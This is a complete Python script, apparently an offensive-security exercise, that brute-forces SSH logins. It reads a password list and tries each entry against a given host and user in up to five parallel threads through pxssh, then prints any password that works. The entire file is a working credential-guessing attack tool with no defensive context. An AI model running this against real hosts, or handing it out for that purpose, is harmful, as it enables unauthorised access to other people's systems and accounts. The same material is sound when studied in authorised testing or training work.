import pxssh
import optparse
import time
from  threading import *

maxConnections = 5
conn_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print(s.before)


def connect(host, user, password, release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("[+]Password Found:", password)
        Found = True
        return s
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
        else:
            print("[-] Error connecting", e)
    finally:
        if release:
            conn_lock.release()


def main():
    parser = optparse.OptionParser("usage%prog --host <target host> --user <user> --pf <file contains passwords>")
    parser.add_option('--host', dest='host')
    parser.add_option('--user', dest='user')
    parser.add_option('--pf', dest='pf')

    options, args = parser.parse_args()
    host = options.host
    user = options.user
    passwordFile = options.pf
    if not (host and user and passwordFile):
        print(parser.usage)
        exit(0)
    for line in open(passwordFile):
        if Found:
            print("[*] Exiting:Password Found")
            exit(0)
        if Fails > 5:
            print("[!] Exiting: Too Many Socket Timeouts")
            exit(0)
        conn_lock.acquire()
        password = line.strip()
        print('[-] Testing:', password)
        t = Thread(target=connect, args=(host, user, password, True))
        t.start()


if __name__ == '__main__':
    main()
